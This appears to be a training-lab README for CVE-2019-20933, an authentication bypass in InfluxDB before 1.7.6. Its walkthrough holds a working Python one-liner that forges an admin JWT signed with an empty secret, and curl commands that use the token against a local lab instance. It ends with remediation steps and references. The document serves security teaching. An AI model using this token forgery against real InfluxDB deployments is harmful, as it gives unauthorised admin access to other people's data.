# InfluxDB Empty Shared Secret JWT Authentication Bypass (CVE-2019-20933)

## Overview

InfluxDB is an open-source time series database widely used in IoT and monitoring pipelines. In InfluxDB versions prior to 1.7.6, when JWT authentication is enabled, the shared signing secret defaults to an empty string. Remote attackers can forge an administrative JWT token signed with an empty key and authenticate as admin without knowing the password.

- **Service Access**: `http://localhost:8164/`
- **Default Credentials**: `Unauthenticated JWT signature with empty secret`
- **Docker Shortcut**: `./lab start influxdb-jwt-bypass`
- **Container Name**: `cyberlab_02_influxdb_jwt_bypass`
- **RAM Footprint**: ~80M

---

## Exploitation Walkthrough

### 1. Query Database Query Endpoint (Expect 401 Unauthorized)

```bash
curl -i 'http://localhost:8164/query?q=SHOW+USERS'
```

### 2. Generate Forged Admin JWT Token (Signed with empty key)

```bash
python3 -c "
import hmac, hashlib, base64, json
h = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}').decode().rstrip('=')
p = base64.urlsafe_b64encode(b'{\"username\":\"admin\",\"exp\":1893456000}').decode().rstrip('=')
sig = base64.urlsafe_b64encode(hmac.new(b'', f'{h}.{p}'.encode(), hashlib.sha256).digest()).decode().rstrip('=')
print(f'{h}.{p}.{sig}')
" > /tmp/jwt.txt
```

### 3. Execute Administrative InfluxQL Queries with Token

```bash
TOKEN=$(cat /tmp/jwt.txt)
curl -H "Authorization: Bearer $TOKEN" 'http://localhost:8164/query?q=SHOW+DATABASES'
```

---

## Defensive Remediation & Hardening

1. Upgrade InfluxDB to version 1.7.6 or newer.
2. Ensure shared-secret configuration parameter is populated with a high-entropy secret.
3. Audit exposed InfluxDB API ports.

---

## Video Walkthroughs & Technical References

- [NoSQLi Tutorial Using PortSwigger (with labs)](https://www.youtube.com/watch?v=5SmDLBQxmXw)
- [InfluxData CVE-2019-20933 Release Notes](https://github.com/influxdata/influxdb/issues/12927)
- [Vulhub InfluxDB Environment](https://vulhub.org/#/environments/influxdb/CVE-2019-20933/)
